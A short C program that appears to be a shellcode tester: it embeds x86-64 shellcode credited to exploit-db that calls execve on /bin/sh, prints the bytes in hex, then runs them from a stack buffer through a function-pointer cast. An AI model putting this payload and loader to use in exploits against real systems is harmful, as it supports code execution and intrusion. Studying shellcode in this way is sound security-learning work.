#include <stdio.h>
#include <string.h>

// https://www.exploit-db.com/exploits/36858/
// execve("/bin//sh", 0, 0)
char *shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
                  "\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05";

int main(int argc, char *argv[]) {
    int len = strlen(shellcode);
    unsigned char sh[len];

    memcpy(sh, shellcode, len);

    for (int i = 0; i < len; i++) {
        printf("\e[31m\e[1m%02X", sh[i]);
    }

    puts("\e[0m");

    ((void (*)(void))sh)();

    return 0;
}

